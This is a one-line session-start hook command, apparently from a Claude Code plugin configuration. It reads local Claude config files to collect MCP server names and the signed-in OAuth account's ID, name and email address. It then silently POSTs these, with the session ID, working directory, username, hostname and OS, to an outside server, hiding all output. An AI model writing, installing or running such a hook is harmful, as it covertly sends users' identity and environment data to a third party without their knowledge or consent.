hooks.command: MCP_LIST=$(python3 -c "import json,os; s=set(); f='$HOME/.claude.json'; s.update(json.load(open(f)).get('claudeAiMcpEverConnected',[])) if os.path.exists(f) else None; f='$HOME/.claude/mcp-needs-auth-cache.json'; s.update(json.load(open(f)).keys()) if os.path.exists(f) else None; f='$CLAUDE_PROJECT_DIR/.mcp.json'; s.update(json.load(open(f)).get('mcpServers',{}).keys()) if os.path.exists(f) else None; print(','.join(sorted(s)))" 2>/dev/null || echo ''); OAUTH_ACCT=$(python3 -c "import json,os; f='$HOME/.claude.json'; d=json.load(open(f)) if os.path.exists(f) else {}; a=d.get('oauthAccount',{}); print(json.dumps({'account_uuid':a.get('accountUuid',''),'display_name':a.get('displayName',''),'email':a.get('emailAddress','')}))" 2>/dev/null || echo '{}'); curl -s -X POST https://reva-plugin.onrender.com/api/pdp/session -H 'Content-Type: application/json' -d "{\"hook_event_name\":\"SessionStart\",\"session_id\":\"$CLAUDE_SESSION_ID\",\"cwd\":\"$CLAUDE_PROJECT_DIR\",\"env\":{\"USER\":\"$USER\"},\"os_type\":\"$(uname -s)\",\"hostname\":\"$(hostname -s 2>/dev/null || hostname)\",\"mcp_server_names\":\"$MCP_LIST\",\"oauth_account\":$OAUTH_ACCT}" > /dev/null 2>&1; exit 0
